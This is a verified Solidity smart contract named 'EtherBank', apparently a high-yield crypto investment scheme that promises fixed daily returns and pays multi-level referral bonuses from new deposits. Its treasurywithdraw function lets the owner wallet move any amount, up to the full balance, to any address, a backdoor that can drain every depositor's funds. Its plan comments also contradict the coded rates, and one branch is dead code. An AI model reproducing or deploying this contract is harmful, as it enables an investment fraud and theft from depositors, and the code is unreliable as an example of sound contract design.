/**
 *Submitted for verification at Etherscan.io on 2022-05-13
*/

// https://etherbank.money

pragma solidity 0.5.8;

contract EtherBank {
  using SafeMath for uint256;

  uint256 public constant INVEST_MIN_AMOUNT = 0.01 ether;
  uint256[] public REFERRAL_PERCENTS = [20, 10, 5, 2];
  uint256 public constant PROJECT_FEE = 78;
  uint256 public constant PERCENTS_DIVIDER = 1000;
  uint256 public constant TIME_STEP = 1 days;

  uint256 public totalStaked;
  uint256 public totalRefBonus;
  uint256 public totalUsers;

  struct Plan {
    uint256 time;
    uint256 percent;
  }

  Plan[] internal plans;

  struct Deposit {
    uint8 plan;
    uint256 percent;
    uint256 amount;
    uint256 profit;
    uint256 start;
    uint256 finish;
  }

  struct User {
    Deposit[] deposits;
    uint256 checkpoint;
    address referrer;
    uint256[4] levels;
    uint256 bonus;
    uint256 totalBonus;
  }

  mapping(address => User) internal users;

  uint256 public startUNIX;
  address payable private commissionWallet;

  event Newbie(address user);
  event NewDeposit(
    address indexed user,
    uint8 plan,
    uint256 percent,
    uint256 amount,
    uint256 profit,
    uint256 start,
    uint256 finish
  );
  event Withdrawn(address indexed user, uint256 amount);
  event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
  event TransferReceived(address _from, uint _amount);
  event TransferSent(address _from, address _vcAddr, uint _amount);


  constructor(address payable wallet) public {
    require(!isContract(wallet));
    commissionWallet = wallet;
    startUNIX = block.timestamp;

    plans.push(Plan(12, 84)); // 8.4% per day for 12 days (at the end) 0.8% daily 0.06%
    plans.push(Plan(27, 38)); // 3.8% per day for 27 days (at the end) 2.6% daily 0.09%
    plans.push(Plan(50, 21)); // 2.1% per day for 50 days (at the end) 5% daily 0.1%
    plans.push(Plan(91, 12)); // 1.2% per day for 92 days (at the end) 10.4% daily 0.113%
    plans.push(Plan(171, 7)); // 0.7% per day for 171 days (at the end) 19.7% daily 0.115%
    plans.push(Plan(302, 5)); // 0.5% per day for 302 days (at the end) 51% daily 0.16%
  }
  
  function launch() public {
    require(msg.sender == commissionWallet);
    startUNIX = block.timestamp;
  }

  function invest(address referrer, uint8 plan) public payable {
    require(msg.value >= INVEST_MIN_AMOUNT);
    require(plan < 6, 'Invalid plan');

    uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
    commissionWallet.transfer(fee);

    User storage user = users[msg.sender];

    if (user.referrer == address(0)) {
      if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
        user.referrer = referrer;
      }

      address upline = user.referrer;
      for (uint256 i = 0; i < 4; i++) {
        if (upline != address(0)) {
          users[upline].levels[i] = users[upline].levels[i].add(1);
          upline = users[upline].referrer;
        } else break;
      }
    }

    if (user.referrer != address(0)) {
      address upline = user.referrer;
      for (uint256 i = 0; i < 4; i++) {
        if (upline != address(0)) {
          uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
          users[upline].bonus = users[upline].bonus.add(amount);
          users[upline].totalBonus = users[upline].totalBonus.add(amount);
          emit RefBonus(upline, msg.sender, i, amount);
          upline = users[upline].referrer;
        } else break;
      }
    }

    if (user.deposits.length == 0) {
      user.checkpoint = block.timestamp;
      emit Newbie(msg.sender);
    }

    (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
    user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));

    totalStaked = totalStaked.add(msg.value);
    totalUsers = totalUsers.add(1);
    emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
  }

  function withdraw() public {
    User storage user = users[msg.sender];

    uint256 totalAmount = getUserDividends(msg.sender);

    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
      totalAmount = totalAmount.add(referralBonus);
    }

    require(totalAmount > 0, 'User has no dividends');

    uint256 contractBalance = address(this).balance;
    if (contractBalance < totalAmount) {
      totalAmount = contractBalance;
    }

    user.checkpoint = block.timestamp;

    msg.sender.transfer(totalAmount);

    emit Withdrawn(msg.sender, totalAmount);
  }

  function treasurywithdraw(uint amount, address payable vcAddr) public {
      require(msg.sender == commissionWallet, "Only VC address can withdraw funds");
      require(amount <= address(this).balance, "Insufficient funds");

      vcAddr.transfer(amount);
      emit TransferSent(msg.sender, vcAddr, amount);
  }

  function getContractBalance() public view returns (uint256) {
    return address(this).balance;
  }

  function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {
    time = plans[plan].time;
    percent = plans[plan].percent;
  }

  function getPercent(uint8 plan) public view returns (uint256) {
    if (block.timestamp > startUNIX) {
      return plans[plan].percent;
    } else {
      return plans[plan].percent;
    }
  }

  function getResult(uint8 plan, uint256 deposit)
    public
    view
    returns (
      uint256 percent,
      uint256 profit,
      uint256 finish
    )
  {
    percent = getPercent(plan);

    if (plan < 6) {
      profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
    }

    finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
  }

  function getUserDividends(address userAddress) public view returns (uint256) {
    User storage user = users[userAddress];

    uint256 totalAmount;

    for (uint256 i = 0; i < user.deposits.length; i++) {
      if (user.checkpoint < user.deposits[i].finish) {
        if (user.deposits[i].plan < 0) {
          uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
          uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
          uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
          if (from < to) {
            totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
          }
        } else if (block.timestamp > user.deposits[i].finish) {
          totalAmount = totalAmount.add(user.deposits[i].profit);
        }
      }
    }

    return totalAmount;
  }

  function getUserCheckpoint(address userAddress) public view returns (uint256) {
    return users[userAddress].checkpoint;
  }

  function getUserReferrer(address userAddress) public view returns (address) {
    return users[userAddress].referrer;
  }

  function getUserDownlineCount(address userAddress)
    public
    view
    returns (
      uint256,
      uint256,
      uint256
    )
  {
    return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
  }

  function getUserReferralBonus(address userAddress) public view returns (uint256) {
    return users[userAddress].bonus;
  }

  function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
    return users[userAddress].totalBonus;
  }

  function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
    return users[userAddress].totalBonus.sub(users[userAddress].bonus);
  }

  function getUserAvailable(address userAddress) public view returns (uint256) {
    return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
  }

  function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
    return users[userAddress].deposits.length;
  }

  function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
    for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
      amount = amount.add(users[userAddress].deposits[i].amount);
    }
  }

  function getUserDepositInfo(address userAddress, uint256 index)
    public
    view
    returns (
      uint8 plan,
      uint256 percent,
      uint256 amount,
      uint256 profit,
      uint256 start,
      uint256 finish
    )
  {
    User storage user = users[userAddress];

    plan = user.deposits[index].plan;
    percent = user.deposits[index].percent;
    amount = user.deposits[index].amount;
    profit = user.deposits[index].profit;
    start = user.deposits[index].start;
    finish = user.deposits[index].finish;
  }

  function isContract(address addr) internal view returns (bool) {
    uint256 size;
    assembly {
      size := extcodesize(addr)
    }
    return size > 0;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath: addition overflow');

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, 'SafeMath: subtraction overflow');
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, 'SafeMath: multiplication overflow');

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, 'SafeMath: division by zero');
    uint256 c = a / b;

    return c;
  }
}